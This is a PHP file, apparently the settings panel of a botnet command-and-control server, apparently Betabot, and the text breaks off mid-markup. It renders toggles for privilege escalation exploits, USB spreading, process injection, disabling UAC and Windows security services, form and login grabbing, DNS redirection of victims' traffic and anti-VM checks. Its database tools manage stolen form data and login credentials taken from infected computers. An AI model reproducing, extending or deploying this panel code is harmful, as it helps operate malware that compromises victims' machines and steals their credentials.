$blacklist_tor_value = "";
$security_disable_gateway_value = "";
$security_ignore_vm_value = "";
$event_enabled_value = "";
$event_e_logins_value = "";
$event_e_settings_value = "";
$event_e_tasks_value = "";
$event_e_users_value = "";
$event_mask_ips_value = "";
$event_e_user_modify_value = "";
$event_e_task_edit_value = "";
$event_e_task_delete_value = "";
$event_e_fg_filters_value = "";
$event_e_grabber_status_value = "";
$event_e_fs_modify_value = "";
$event_e_db_actions_value = "";
if ($sqlSettings->General_Options & GENERAL_OPTION_DISABLE_MAINPAGE_INDV_GRABS_STATS) {
    $gen_option_noinfograbstats_value = "checked";
}
if ($sqlSettings->General_Options & GENERAL_OPTION_MAIN_PAGE_VIEW_MINIMUM_STATS) {
    $gen_view_minimum_stats_value = "checked";
}
if ($sqlSettings->General_Options & GENERAL_OPTION_FORM_PAGE_VIEW_MINIMUM_INFO) {
    $gen_view_minimum_form_info = "checked";
}
if ($sqlSettings->General_Options & GENERAL_OPTION_MAIN_PAGE_NO_CHARTS) {
    $gen_no_charts_value = "checked";
}
if ($sqlSettings->General_Options & GENERAL_OPTION_GATE_DEBUG_OUTPUT_ENABLED) {
    $gen_option_debug_output_value = "checked";
}
if ($sqlSettings->General_Options & GENERAL_OPTION_SEND_UPDATE_TASK_ONLY_ON_CHECKIN) {
    $adv_panel_update_only_on_checkin_value = "checked";
}
if ($sqlSettings->Flags_General & GENERAL_FLAGS_PROACTIVE_DEFENSE_ENABLED) {
    $proactive_value = "checked";
}
if ($sqlSettings->Flags_General & GENERAL_FLAGS_PROACTIVE_MINER_DEFENSE_ENABLED) {
    $proactive_miner_value = "checked";
}
if ($sqlSettings->Flags_General & GENERAL_FLAGS_AGGRESSIVE_PROACTIVE_DEFENSE_ENABLED) {
    $proactive_agr_value = "checked";
}
if ($sqlSettings->Flags_General & GENERAL_FLAGS_PRIVILEGE_ESCALATION_EXPLOITS_ENABLED) {
    $use_privesc_exploits_value = "checked";
}
if ($sqlSettings->Flags_General & GENERAL_FLAGS_PROACTIVE_ANTI_OLDER_BETABOT_ENABLED) {
    $antibetabot_value = "checked";
}
if ($sqlSettings->Flags_General & GENERAL_FLAGS_USB_SPREAD_ENABLED) {
    $usb_spread_value = "checked";
}
if ($sqlSettings->Flags_General & GENERAL_FLAGS_SYS_INJECTIONS_DISABLED) {
    $syscomponents_value = "checked";
}
if ($sqlSettings->Flags_General & GENERAL_FLAGS_SYS_INJECTIONS_XBROWSER_DISABLED) {
    $syscomponents_browser_only_value = "checked";
}
if ($sqlSettings->Flags_General & GENERAL_FLAGS_ANTI_EXPLOIT_KIT_ENABLED) {
    $anti_ek_value = "checked";
}
if ($sqlSettings->Flags_General & GENERAL_FLAGS_ANTI_BOOTKIT_ENABLED) {
    $anti_bootkit_value = "checked";
}
if ($sqlSettings->Flags_General & GENERAL_FLAGS_FORCE_IE_ENABLED) {
    $forceie_value = "checked";
}
if ($sqlSettings->Flags_Minor & MINOR_FLAGS_DISABLE_IMAGE_EXECUTION_OPTIONS_FUNC) {
    $adv_avk_disable_ieo_value = "checked";
}
if ($sqlSettings->Flags_Minor & MINOR_FLAGS_DISABLE_UAC_FAKE_WINDOW) {
    $adv_avk_no_fakewin_value = "checked";
}
if ($sqlSettings->Flags_Minor & MINOR_FLAGS_DO_NOT_DISABLE_WINDOWS_SEC_SERVICES) {
    $adv_avk_no_disable_services_value = "checked";
}
if ($sqlSettings->Flags_Minor & MINOR_FLAGS_DISABLE_AUTOUPDATES_ADDONS) {
    $adv_avk_disable_autoupdates_value = "checked";
}
if ($sqlSettings->Flags_Minor & MINOR_FLAGS_DISABLE_LUA) {
    $adv_avk_disable_lua_value = "checked";
}
if ($sqlSettings->Flags_Minor & MINOR_FLAGS_ENABLE_DEBUG_MSG_SYSTEM) {
    $adv_debug_msg_system_value = "checked";
}
if ($sqlSettings->Flags_Minor & MINOR_FLAGS_ENABLE_DEBUG_ATTRIBUTES) {
    $adv_debug_attributes_value = "checked";
}
if ($sqlSettings->Flags_Blobs & INFOBLOB_FLAGS_PROCESS_LIST) {
    $adv_blobs_process_list_value = "checked";
}
if ($sqlSettings->Flags_Blobs & INFOBLOB_FLAGS_INSTALLED_SOFTWARE_LIST) {
    $adv_blobs_software_list_value = "checked";
}
if ($sqlSettings->Flags_Blobs & INFOBLOB_FLAGS_AUTOSTART_LIST) {
    $adv_blobs_autostart_list_value = "checked";
}
if ($sqlSettings->Flags_Blobs & INFOBLOB_FLAGS_GENERIC_INFO) {
    $adv_blobs_generic_value = "checked";
}
if ($sqlSettings->Flags_Blobs & INFOBLOB_FLAGS_DEBUG_INFO) {
    $adv_blobs_debug_value = "checked";
}
if ($sqlSettings->Flags_Minor & MINOR_FLAGS_FORMGRAB_FILTER_USELESS_GRABS) {
    $adv_formgrab_filter_useless_value = "checked";
}
if ($sqlSettings->Flags_Minor & MINOR_FLAGS_DISABLE_INJECT_INTO_LOADERS) {
    $adv_inject_disable_loader_injection = "checked";
}
if ($sqlSettings->Flags_Minor & MINOR_FLAGS_DISABLE_SSL_CERTIFICATE_WARNINGS) {
    $adv_nosslcertwarnings_value = "checked";
}
if ($sqlSettings->Flags_General & GENERAL_FLAGS_USERKIT_DISABLED) {
    $adv_userkit_value = "checked";
}
if ($sqlSettings->Flags_Minor & MINOR_FLAGS_DISABLE_USERKIT_64BIT) {
    $adv_userkit64_value = "checked";
}
if ($sqlSettings->Flags_Minor & MINOR_FLAGS_INSTALL_ENABLE_SHELL_FOLDER) {
    $adv_install_use_shell_folder = "checked";
}
if ($sqlSettings->Flags_Minor & MINOR_FLAGS_INSTALL_USE_HKLM_RUNONCE) {
    $adv_install_use_runonce_value = "checked";
}
if ($sqlSettings->Flags_Security & SECURITY_FLAGS_BLACKLIST_ENABLED) {
    $blacklist_status_value = "checked";
}
if ($sqlSettings->Flags_Security & SECURITY_FLAGS_BLACKLIST_PROACTIVE_ENABLED) {
    $blacklist_proactive_value = "checked";
}
if ($sqlSettings->Flags_Security & SECURITY_FLAGS_PANEL_BLACKLIST_TOR) {
    $blacklist_tor_value = "checked";
}
if ($sqlSettings->Flags_Security & SECURITY_FLAGS_PANEL_GATEWAY_DISABLED) {
    $security_disable_gateway_value = "checked";
}
if ($sqlSettings->Flags_Security & SECURITY_FLAGS_PANEL_IGNORE_COMMS_VM) {
    $security_ignore_vm_value = "checked";
}
if ($sqlSettings->LogOptions & EVENT_OPTION_ENABLED) {
    $event_enabled_value = "checked";
}
if ($sqlSettings->LogOptions & EVENT_OPTION_E_LOGINS) {
    $event_e_logins_value = "checked";
}
if ($sqlSettings->LogOptions & EVENT_OPTION_E_SETTINGS) {
    $event_e_settings_value = "checked";
}
if ($sqlSettings->LogOptions & EVENT_OPTION_E_TASKS) {
    $event_e_tasks_value = "checked";
}
if ($sqlSettings->LogOptions & EVENT_OPTION_E_USERS) {
    $event_e_users_value = "checked";
}
if ($sqlSettings->LogOptions & EVENT_OPTION_MASK_IPS) {
    $event_mask_ips_value = "checked";
}
if ($sqlSettings->LogOptions & EVENT_OPTION_E_USER_MODIFIED) {
    $event_e_user_modify_value = "checked";
}
if ($sqlSettings->LogOptions & EVENT_OPTION_E_TASK_EDIT) {
    $event_e_task_edit_value = "checked";
}
if ($sqlSettings->LogOptions & EVENT_OPTION_E_TASK_DELETE) {
    $event_e_task_delete_value = "checked";
}
if ($sqlSettings->LogOptions & EVENT_OPTION_E_FORMS_MODIFIED_FILTERS) {
    $event_e_fg_filters_value = "checked";
}
if ($sqlSettings->LogOptions & EVENT_OPTION_E_GRABBER_STATUS_CHANGED) {
    $event_e_grabber_status_value = "checked";
}
if ($sqlSettings->LogOptions & EVENT_OPTION_E_FILE_SEARCH_UPDATED) {
    $event_e_fs_modify_value = "checked";
}
if ($sqlSettings->LogOptions & EVENT_OPTION_E_DB_WIPED_RECORDS) {
    $event_e_db_actions_value = "checked";
}
echo "\n<script>\n\tfunction tts() {\n\t\tvar t_bad = ['>', '<', '\\'', '\"', '\\\\', '@', '!', ',', '~', '?', '#', '\$', '%', '(', ')', '`'];\n\t\tvar t_content = document.getElementById('dnslist').value;\n\n\t\tfor ( var i = 0; i <= t_bad.length; i++ ) {\n\t\t\tif ( t_content.indexOf(t_bad[i]) > -1 ) {\n\t\t\t\t// Invalid character\n\t\t\t\t//\n\t\t\t\talert('Invalid character detected:   ' + t_bad[i] + '\\r\\n\\r\\nPlease only use alphanumeric characters and/or the following: . and - (period, dash and space)\\r\\n');\n\t\t\t\treturn false;\n\t\t\t}\n\t\t}\n\t\t\n\t\treturn true;\n\t}\n</script>\n\n<!-- Modal for database management -->\n\n<div class=\"container\" style=\"font-size: 10px; face: font-family: Tahoma;\">\n\t<div id=\"dbmanage\" class=\"modal hide fade in\" style=\"display: none; \">\n\t\t<div class=\"modal-header\">\n\t\t<a class=\"close\" data-dismiss=\"modal\"></a>\n\t\t<h3><center>Database Management</center></h3>\n\t</div>\n\t<form class=\"db_manage\" style=\"display:inline;\" method=\"post\" action=\"";
echo $_SERVER["REQUEST_URI"];
echo "\">\n\t<div class=\"modal-body\">\n\t\t<font size=\"2\" face=\"Tahoma\">\n\t\t\t<table class=\"table-condensed\" align=\"left\">\n\t\t\t\t<tr>\n\t\t\t\t\t<td>\n\t\t\t\t\t\t<span style=\"position: relative; top: -6px; font-size: 10px; face: font-family: Tahoma;\">Clear dead bots from the database. When bots are marked dead, they are still kept in the database for a period of at least 20 days. Click the button below to clear all bots marked as 'dead' (regardless of how long they have been in that state) from the database. <i>You cannot undo this operation. All changes are permanent!</i></span>\n\t\t\t\t\t\t<br />\n\t\t\t\t\t\t<input type=\"submit\" class=\"btn btn-primary\" name=\"db_clear_dead_bots\" value=\"Clear dead bots\" style=\"font-size: 10px; face: font-family: Tahoma;\">\n\t\t\t\t\t\t<br />\n\t\t\t\t\t\t<br />\n\t\t\t\t\t\t<br />\n\t\t\t\t\t\t<span style=\"position: relative; top: -6px; font-size: 10px; face: font-family: Tahoma;\">Clear all logs. This will clear all logs that bots have uploaded. This includes <strong>form data</strong>, <strong>stored login information</strong> and any other data captured from a client's computer. Once this is erased, <i>it is unrecoverable. All changes are permanent!</i></span>\n\t\t\t\t\t\t<br />\n\t\t\t\t\t\t<input type=\"submit\" class=\"btn btn-primary\" name=\"db_clear_logs\" value=\"Clear stored logs\" style=\"font-size: 10px; face: font-family: Tahoma;\">\n\t\t\t\t\t\t<br />\n\t\t\t\t\t\t<br />\n\t\t\t\t\t\t<br />\n\t\t\t\t\t\t<span style=\"position: relative; top: -6px; font-size: 10px; face: font-family: Tahoma;\">Clear all client records. This will reset the clients table and all records of identified bots will be erased. Logs will remain but only be identifiable with limited information. Once this is erased, <i>it is unrecoverable. All changes are permanent!</i></span>\n\t\t\t\t\t\t<br />\n\t\t\t\t\t\t<input type=\"submit\" class=\"btn btn-primary\" name=\"db_clear_clients\" value=\"Clear all client records\" style=\"font-size: 10px; face: font-family: Tahoma;\">\n\t\t\t\t\t</td>\n\t\t\t\t</tr>\n\t\t\t</table>\n\t\t</font>\n\t</div>\n\n\t<div class=\"modal-footer\" align=\"right\">\n\t\t<a href=\"#\" class=\"btn\" data-dismiss=\"modal\">Close</a>\n\t\t</form>\n\t</div>\n</div>\n\n<!-- Modal for Domain/IP modification list -->\n<div class=\"container\">\n\t<div id=\"dnsmodifym\" class=\"modal hide fade in\" style=\"display: none; \">\n\t\t<div class=\"modal-header\">\n\t\t<a class=\"close\" data-dismiss=\"modal\"></a>\n\t\t<h3><center>List of Domain/IPs to modify/redirect</center></h3>\n\t</div>\n\t<form class=\"dnsinfo\" style=\"display:inline;\" method=\"post\" onsubmit=\"return tts();\" action=\"";
echo $_SERVER["REQUEST_URI"];
echo "\">\n\t<div class=\"modal-body\">\n\t\t<font size=\"2\" face=\"Tahoma\">\n\t\t\t<table class=\"table-condensed\" align=\"left\">\n\t\t\t\t<tr>\n\t\t\t\t\t<td>\n\t\t\t\t\t\tEnter domain or IP entries in this format:<br /><br />\n\t\t\t\t\t\t<i>domain.com 127.0.0.1<br />\n\t\t\t\t\t\tsub.blah.com 10.0.0.1<br />\n\t\t\t\t\t\t82.165.1.57 127.0.0.1</i><br /><br />\n\t\t\t\t\t\tAnd so on. Wildcards are accepted. Failure to abide precisely by this format could result in unknown errors. Maximum of <strong>1024</strong> entries are allowed.\n\t\t\t\t\t\t<br />\n\t\t\t\t\t\t<br />\n\t\t\t\t\t\t<textarea name=\"dnslist\" id=\"dnslist\" rows=\"11\" cols=\"195\" style=\"width: 510px;\">";
echo $dns_list_data;
echo "</textarea>\n\t\t\t\t\t</td>\n\t\t\t\t</tr>\n\t\t\t</table>\n\t\t</font>\n\t</div>\n\n\t<div class=\"modal-footer\" align=\"right\">\n\t\t<input type=\"submit\" class=\"btn btn-primary\" name=\"dns_submit\" value=\"Save list\">\n\t\t<a href=\"#\" class=\"btn\" data-dismiss=\"modal\">Close</a>\n\t\t</form>\n\t</div>\n</div>\n<!-- End Modal -->\n\n<!-- Modal for blacklist edit -->\n<div class=\"container\">\n\t<div id=\"blacklist_edit\" class=\"modal hide fade in\" style=\"display: none; \">\n\t\t<div class=\"modal-header\">\n\t\t<a class=\"close\" data-dismiss=\"modal\"></a>\n\t\t<h3><center>IP Blacklist</center></h3>\n\t</div>\n\t<form class=\"dbinfo\" style=\"display:inline;\" method=\"post\" onsubmit=\"return tts();\" action=\"";
echo $_SERVER["REQUEST_URI"];
echo "\">\n\t<div class=\"modal-body\">\n\t\t<font size=\"2\" face=\"Tahoma\">\n\t\t\t<table class=\"table-condensed\" align=\"left\">\n\t\t\t\t<tr>\n\t\t\t\t\t<td>\n\t\t\t\t\t\tEnter blacklisted IPs in the following format:<br /><br />\n\t\t\t\t\t\t<i>127.0.0.1:<i>&lt;reason ID&gt;</i><br />\n\t\t\t\t\t\t10.1.1.255:1<br />\n\t\t\t\t\t\t169.168.1.2:5</i><br /><br />\n\t\t\t\t\t\tIDs: &nbsp; <strong>1</strong> = Suspicious Behavior, <strong>2</strong> = Honeypot, <strong>3</strong> = Other, <strong>4</strong> = SQLi Attempt(s), <strong>5</strong> = Login Page Attack(s), <strong>6 and up</strong> = User-defined\n\t\t\t\t\t\t<br />\n\t\t\t\t\t\t<br />\n\t\t\t\t\t\t<textarea name=\"blacklistips\" id=\"dnslist\" rows=\"11\" cols=\"195\" style=\"width: 510px;\">";
echo $blacklist_data;
echo "</textarea>\n\t\t\t\t\t</td>\n\t\t\t\t</tr>\n\t\t\t</table>\n\t\t</font>\n\t</div>\n\n\t<div class=\"modal-footer\" align=\"right\">\n\t\t<input type=\"submit\" class=\"btn btn-primary\" name=\"blacklist_submit\" value=\"Save list\">\n\t\t<a href=\"#\" class=\"btn\" data-dismiss=\"modal\">Close</a>\n\t\t</form>\n\t</div>\n</div>\n<!-- End Modal -->\n\n<!-- form begin-->\n<form class=\"settings_panel\" style=\"display:inline;\" method=\"post\" action=\"";
echo $_SERVER["REQUEST_URI"];
echo "\">\n\n";
$active_pane = 1;
if (isset($_GET["logs_page"])) {
    $active_pane = 6;
}
if (isset($_GET["hi"]) && $_GET["hi"] == "dns") {
    $active_pane = 5;
}
if (isset($_GET["hi"]) && $_GET["hi"] == "usb") {
    $active_pane = 2;
}
$ac_tag = "class=\"active\"";
echo "<div class=\"tabbable\">\n  <ul class=\"nav nav-tabs\">\n    <li ";
echo $active_pane == 1 ? $ac_tag : "";
echo "><a href=\"#pane1\" data-toggle=\"tab\">General</a></li>\n    <li ";
echo $active_pane == 2 ? $ac_tag : "";
echo "><a href=\"#pane2\" data-toggle=\"tab\">Bot&nbsp;&nbsp;&nbsp;</a></li>\n\t<li ";
echo $active_pane == 3 ? $ac_tag : "";
echo "><a href=\"#pane3\" data-toggle=\"tab\">Advanced&nbsp;&nbsp;&nbsp;</a></li>\n    <li ";
echo $active_pane == 4 ? $ac_tag : "";
echo "><a href=\"#pane4\" data-toggle=\"tab\">Security</a></li>\n    <li ";
echo $active_pane == 5 ? $ac_tag : "";
echo "><a href=\"#pane5\" data-toggle=\"tab\">Domain/IP Modification</a></li>\n\t<li ";
echo $active_pane == 6 ? $ac_tag : "";
echo "><a href=\"#pane6\" data-toggle=\"tab\">Logs&nbsp;&nbsp;&nbsp;</a></li>\n  </ul>\n  <div class=\"tab-content\">\n    <div id=\"pane1\" class=\"tab-pane ";
echo $active_pane == 1 ? "active" : "";
echo "\">\n\t\t<!-- General Settings -->\n\t\t<table class=\"table-bordered\" cellpadding=\"10\" valign=\"top\" align=\"center\" width=\"100%\">\n\t\t\t<tr>\n\t\t\t\t<td><strong><font size=\"2\">General settings</font></strong></td>\n\t\t\t</tr>\n\t\t\t<tr>\n\t\t\t\t<td>\n\t\t\t\t\t<span style=\"position: relative; top: -5px;\">Language:&nbsp;&nbsp;</span>\n\t\t\t\t\t\t<select name=\"sel_language\" style=\"height: 26px; font-size: 10px; face: font-family: Tahoma;\">\n\t\t\t\t\t\t\t<option>English</option>\n\t\t\t\t\t\t</select>\n\t\t\t\t\t<br />\n\t\t\t\t\t<!-- Operation name - Serves no _REAL_ purpose -->\n\t\t\t\t\t<span style=\"position: relative; top: -5px;\">Operation name:&nbsp;&nbsp;</span>\n\t\t\t\t\t<input type=\"text\" class=\"span3\" name=\"botnet_name\" value=\"";
echo $sqlSettings->Name;
echo "\" style=\"position: relative; top: -1px; width: 193px; height: 13px; font-size: 10px; face: font-family: Tahoma; ";
echo $botnet_name_fix;
echo "\">\n\t\t\t\t\t\t\n\t\t\t\t\t<br />\n\t\t\t\t\t<br />\n\t\t\t\t\t\n\t\t\t\t\t<table class=\"table-bordered\" style=\"width: 900px; background-color: #F2F2F2; position: relative; top: -4px;\">\n\t\t\t\t\t\t<tr>\n\t\t\t\t\t\t\t<td width=\"99%\">\n\t\t\t\t\t\t\t\t<span style=\"position: relative; left: 6px; top: 11px;\">\n\t\t\t\t\t\t\t\t\t<strong>Optimization options</strong>\n\t\t\t\t\t\t\t\t\t<br />\n\t\t\t\t\t\t\t\t\t<br />\n\t\t\t\t\t\t\t\t</span>\n\t\t\t\t\t\t\t\t<span style=\"position: relative; left: 6px; top: 1px;\">\n\t\t\t\t\t\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma;\">\n\t\t\t\t\t\t\t\t\t\t<input type=\"checkbox\" name=\"panel_genoption_noinfograbstats\" style=\"position: relative; top: -2px;\" ";
echo $gen_option_noinfograbstats_value;
echo ">\n\t\t\t\t\t\t\t\t\t\tDisable individual form/login grab counts for individual bot entries on main page to speed up page loading (";
echo $gen_option_noinfograbstats_value == "checked" ? "ON" : "OFF";
echo ")&nbsp;&nbsp;&nbsp;[ <a id=\"optimize_mainpgrabcount_def\" rel=\"popover\" data-content=\"This toggles whether or not the login grab count and the form grab count for each individual bot entry (under each entry's collapsible quick info field) on the main page will be shown. By disabling the retrieval of this information, 2 database queries per bot are avoided and depending on the server specifications and total size of the net, can speed up the main page rendering time somewhat.\" data-original-title=\"\" href=\"#\">?</a> ]\n\t\t\t\t\t\t\t\t\t</label>\n\t\t\t\t\t\t\t\t\t<span style=\"position: relative; top: 5px;\">\n\t\t\t\t\t\t\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma;\">\n\t\t\t\t\t\t\t\t\t\t\t<input type=\"checkbox\" name=\"checkbox_view_minimum_stats\" style=\"position: relative; top: -2px;\" ";
echo $gen_view_minimum_stats_value;
echo ">\n\t\t\t\t\t\t\t\t\t\t\tView only minimum statistics on main page (";
echo $gen_view_minimum_stats_value == "checked" ? "ON" : "OFF";
echo ")&nbsp;&nbsp;&nbsp;[ <a id=\"optimize_min_stats_def\" rel=\"popover\" data-content=\"Displays only very minimal statistics on the left hand side of the main page. By doing this, less database queries are issued on each page load and thus improves rendering time.\" data-original-title=\"\" href=\"#\">?</a> ]\n\t\t\t\t\t\t\t\t\t\t</label>\n\t\t\t\t\t\t\t\t\t</span>\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t<span style=\"position: relative; top: 10px;\">\n\t\t\t\t\t\t\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma;\">\n\t\t\t\t\t\t\t\t\t\t\t<input type=\"checkbox\" name=\"checkbox_view_minimum_form_info\" style=\"position: relative; top: -2px;\" ";
echo $gen_view_minimum_form_info;
echo ">\n\t\t\t\t\t\t\t\t\t\t\tView only minimum info on 'Manage website grab filters' page (";
echo $gen_view_minimum_form_info == "checked" ? "ON" : "OFF";
echo ")&nbsp;&nbsp;&nbsp;[ <a id=\"optimize_min_fg_info_def\" rel=\"popover\" data-content=\"Omits the number of forms captured for each filter listing. For users with hundreds of filters and many thousands of actual form grabs, this will result in a considerable drop in page load time for the form filters page.\" data-original-title=\"\" href=\"#\">?</a> ]\n\t\t\t\t\t\t\t\t\t\t</label>\n\t\t\t\t\t\t\t\t\t</span>\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t<span style=\"position: relative; top: 15px;\">\n\t\t\t\t\t\t\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma;\">\n\t\t\t\t\t\t\t\t\t\t\t<input type=\"checkbox\" name=\"checkbox_no_charts\" style=\"position: relative; top: -2px;\" ";
echo $gen_no_charts_value;
echo ">\n\t\t\t\t\t\t\t\t\t\t\tDo not display charts / graphs on main page (";
echo $gen_no_charts_value == "checked" ? "ON" : "OFF";
echo ")&nbsp;&nbsp;&nbsp;[ <a id=\"optimize_hide_graphs_def\" rel=\"popover\" data-content=\"Hides the country graphs / charts on the main page.\" data-original-title=\"\" href=\"#\">?</a> ]\n\t\t\t\t\t\t\t\t\t\t</label>\n\t\t\t\t\t\t\t\t\t</span>\n\t\t\t\t\t\t\t\t</span>\n\t\t\t\t\t\t\t\t<br />\n\t\t\t\t\t\t\t\t<span style=\"position: relative; left: 6px; top: -13px;\">\n\t\t\t\t\t\t\t\t\t<br />\n\t\t\t\t\t\t\t\t\t<input data-toggle=\"modal\" type=\"button\" class=\"btn btn-success\" href=\"#dbmanage\" value=\"Database Records Maintenance\" style=\"font-size: 10px; face: font-family: Tahoma;\">&nbsp;\n\t\t\t\t\t\t\t\t\t<input type=\"submit\" class=\"btn btn-primary\" name=\"db_optimize_tables\" value=\"Optimize database\" style=\"font-size: 10px; face: font-family: Tahoma;\">\n\t\t\t\t\t\t\t\t\t&nbsp;\n\t\t\t\t\t\t\t\t\t<input type=\"submit\" class=\"btn btn-primary\" name=\"txt_delete_logfile\" value=\"Delete gate log file\" style=\"font-size: 10px; face: font-family: Tahoma;\">\n\t\t\t\t\t\t\t\t</span>\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t\t<td width=\"1%\" style=\"border: 0;\">\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t</tr>\n\t\t\t\t\t</table>\n\t\t\t\t\t\n\t\t\t\t\t<br />\n\t\t\t\t\t\n\t\t\t\t\t";
$gate_debug_file_size_string = "<i>(File does not currently exist)</i>";
$log_file_size = file_exists(GATE_LOG_FILENAME) ? filesize(GATE_LOG_FILENAME) : false;
if ($log_file_size !== false) {
    $gate_debug_file_size_string = "<i>(currently " . _obfuscated_0D2E023F02263521180730191E042B0A16182A04240701_($log_file_size) . ")</i>";
}
echo "\t\t\t\t\t\n\t\t\t\t\t<table class=\"table-bordered\" style=\"width: 900px; height: 70px; background-color: #F2F2F2; position: relative; top: -4px;\">\n\t\t\t\t\t\t<tr>\n\t\t\t\t\t\t\t<td width=\"99%\">\n\t\t\t\t\t\t\t\t<span style=\"position: relative; left: 6px; top: 6px;\">\n\t\t\t\t\t\t\t\t\t<strong>Debug options</strong>\n\t\t\t\t\t\t\t\t\t<br />\n\t\t\t\t\t\t\t\t\t<br />\n\t\t\t\t\t\t\t\t</span>\n\t\t\t\t\t\t\t\t<span style=\"position: relative; left: 6px; top: -5px;\">\n\t\t\t\t\t\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 395px;\">\n\t\t\t\t\t\t\t\t\t\t<input type=\"checkbox\" name=\"panel_genoption_debug_output\" style=\"position: relative; top: -2px;\" ";
echo $gen_option_debug_output_value;
echo ">\n\t\t\t\t\t\t\t\t\t\tEnable panel gate debug output (";
echo $gen_option_debug_output_value == "checked" ? "ON" : "OFF";
echo ")&nbsp;&nbsp;&nbsp;[ <a id=\"debugoutput_def\" rel=\"popover\" data-content=\"Toggles whether or not to enable output to gate error file (gate_err.txt in main directory). Used for debugging purposes if issues occur during gate processing\" data-original-title=\"\" href=\"#\">?</a> ] &nbsp;";
echo $gate_debug_file_size_string;
echo "\t\t\t\t\t\t\t\t\t</label>\n\t\t\t\t\t\t\t\t</span>\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t\t<td width=\"1%\" style=\"border: 0;\">\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t</tr>\n\t\t\t\t\t</table>\n\t\t\t\t\t\n\t\t\t\t\t<br />\n\t\t\t\t\t";
if ($mCache->IsInitialized() == true) {
    echo "<font color=\"#339900\">Memory caching is enabled.</font>";
} else {
    echo "<font color=\"#E80000\">Memory caching is disabled! Panel optimizations cannot be made without APC extension.</font>";
}
echo "\t\t\t\t</td>\n\t\t\t</tr>\n\t\t</table>\n\n\t\t<br />\n    </div>\n    <div id=\"pane2\" class=\"tab-pane ";
echo $active_pane == 2 ? "active" : "";
echo "\">\n\t\t<!-- Bots -->\n\t\t<table class=\"table-bordered\" cellpadding=\"10\" valign=\"top\" align=\"center\" width=\"100%\" style=\"font-size: 10px; face: font-family: Tahoma;\">\n\t\t\t<tr>\n\t\t\t\t<td><strong><font size=\"2\">Bot settings</font></strong></td>\n\t\t\t</tr>\n\t\t\t<tr>\n\t\t\t\t<td>\n\t\t\t\t\t<table class=\"table-condensed\">\n\t\t\t\t\t\t<tr>\n\t\t\t\t\t\t\t<td width=\"17%\" style=\"border: 0;\">\n\t\t\t\t\t\t\t\t<!-- # of days before declaring bot 'dead' -->\n\t\t\t\t\t\t\t\t<span style=\"position: relative; top: -5px; right: 4px;\">Number of days before bot is marked dead:&nbsp;&nbsp;</span>\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t\t<td width=\"70%\" style=\"border: 0;\">\n\t\t\t\t\t\t\t\t<input type=\"text\" class=\"span3\" name=\"absent_limit\" value=\"";
echo $sqlSettings->AbsentLimit;
echo "\" style=\"position: relative; top: -1px; width: 60px; font-size: 10px; face: font-family: Tahoma; ";
echo $absent_limit_fix;
echo "\">\n\t\t\t\t\t\t\t\t<span style=\"position: relative; top: -5px;\">&nbsp;&nbsp;[ <a id=\"num_days_dead\" rel=\"popover\" data-content=\"The number of days a bot can go without checking in (booting up their computer) before they are marked as 'dead', or in other words, the bot may have been removed after <i>x</i> number of days.\" data-original-title=\"\" href=\"#\">?</a> ]</span>\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t</tr>\n\t\t\t\t\t\t<tr>\n\t\t\t\t\t\t\t<td width=\"17%\" style=\"border: 0;\">\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t<!-- Knock interval, how often bots check for updates -->\n\t\t\t\t\t\t\t\t<span style=\"position: relative; top: -6px; right: 4px;\">Bot knock interval (in minutes):&nbsp;&nbsp;</span>\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t\t<td width=\"70%\" style=\"border: 0;\">\n\t\t\t\t\t\t\t\t<input type=\"text\" class=\"span3\" name=\"knock_interval\" value=\"";
echo $sqlSettings->KnockInterval;
echo "\" style=\"position: relative; top: -1px; width: 60px; font-size: 10px; face: font-family: Tahoma; ";
echo $knock_interval_fix;
echo "\">\n\t\t\t\t\t\t\t\t<span style=\"position: relative; top: -5px;\">&nbsp;&nbsp;[ <a id=\"knock_interval\" rel=\"popover\" data-content=\"The number of minutes to elapse between check-ins. Every <i>x</i> number of minutes, the bot will contact this control server and request any new tasks/information/configuration updates.\" data-original-title=\"\" href=\"#\">?</a> ]</span>\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t</tr>\n\t\t\t\t\t</table>\n\n\t\t\t\t\t<br />\n\t\t\t\t\t\n\t\t\t\t\t<!-- Encryption key for communications between server and client -->\n\t\t\t\t\t<!--<span style=\"position: relative; top: -5px;\">Encryption key (for communications):&nbsp;&nbsp;</span>\n\t\t\t\t\t<input type=\"text\" class=\"span3\" name=\"comms_key\" value=\"";
echo $sqlSettings->CryptKey;
echo "\" style=\"position: relative; top: -1px; width: 220px; ";
echo $comms_key_fix;
echo "\">\n\t\t\t\t\t<span style=\"position: relative; top: -5px;\">&nbsp;&nbsp;[ <a id=\"comms_key\" rel=\"popover\" data-content=\"This is the key that is used to encrypt communications between client and the web server. It is recommended you use a key composed of 16-32 alphanumeric characters.\" data-original-title=\"Bot Communications Encryption Key\" href=\"#\">?</a> ]</span>\n\t\t\t\t\t\t\n\t\t\t\t\t<br />\n\t\t\t\t\t<br />-->\n\t\t\t\t\t\n\t\t\t\t\t<!--style=\"font-size: 11px; face: font-family: Tahoma\"-->\n\t\t\t\t\t\n\t\t\t\t\t<table class=\"table-bordered\" style=\"width: 900px; background-color: #F2F2F2; position: relative; top: -4px;\">\n\t\t\t\t\t\t<tr>\n\t\t\t\t\t\t\t<td width=\"99%\">\n\t\t\t\t\t\t\t\t<br />\n\t\t\t\t\t\t\t\t<span style=\"position: relative; left: 6px; top: -4px;\">\n\t\t\t\t\t\t\t\t<b>Proactive defense modes:</b>\n\t\t\t\t\t\t\t\t<br />\n\t\t\t\t\t\t\t\t<span style=\"position: relative; top: 9px;\">\n\t\t\t\t\t\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 